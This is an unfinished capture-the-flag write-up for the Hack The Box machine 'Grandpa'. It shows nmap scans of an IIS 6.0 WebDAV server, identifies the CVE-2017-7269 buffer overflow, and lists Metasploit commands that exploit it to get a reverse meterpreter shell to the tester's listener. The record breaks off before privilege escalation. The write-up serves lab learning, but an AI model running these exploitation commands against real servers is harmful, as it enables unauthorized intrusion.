# HAck the Box - GrandPa (INCOMPLETE)

```CSS
Machine IP: 10.10.10.14 - Windows
Buffer Overflow (CVE-2017-7269)
```

### Port Scanning and Service Discovery
```CSS
▶ nmap -Pn -sS -p- -T4 --min-rate 1000 10.10.10.14 -oA nmap.surface

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-31 10:40 IST
Nmap scan report for 10.10.10.14
Host is up (0.090s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
```

```CSS
▶ nmap -sC -sV -p 80 10.10.10.14 -oA nmap.deep

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-31 10:43 IST
Nmap scan report for 10.10.10.14
Host is up (0.088s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-title: Under Construction
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|_  Server Date: Fri, 31 Mar 2023 05:13:46 GMT
|_http-server-header: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.89 seconds
```

### Checking for known Vulnerabilities:
![image](https://user-images.githubusercontent.com/83878909/229031974-84d9cf71-7f1b-49cb-b635-a053b238c4fc.png)

![image](https://user-images.githubusercontent.com/83878909/229034116-9125f8ce-83b2-4949-9b83-fd6426814ee8.png)
- [Read More...](https://www.fortinet.com/blog/threat-research/buffer-overflow-attack-targeting-microsoft-iis-6-0-returns)

![image](https://user-images.githubusercontent.com/83878909/229046417-4fd0508a-18d5-44e3-9537-e4dbb5a207d2.png)

### Search Exploit
- Name: `ScStoragePathFromUrl`
- Search Metasploit
![image](https://user-images.githubusercontent.com/83878909/229046789-aeee25e3-5734-4b54-89a3-67b7a29e8a55.png)

### Exploit
#### User Access
```CSS
msf6> use exploit/windows/iis/iis_webdav_scstoragepathfromurl
msf6> set RHOSTS 10.10.10.14
msf6> set LHOST 10.10.14.34
msf6> exploit
```
![image](https://user-images.githubusercontent.com/83878909/229052744-ef9e0f9b-9225-4d1b-92f4-c82e487d5e79.png)
![image](https://user-images.githubusercontent.com/83878909/229055181-d755ef79-b391-491d-aaab-4a7fe0258e39.png)

#### Root Access
- `Ctrl+C`
```CSS
meterpreter> background


```

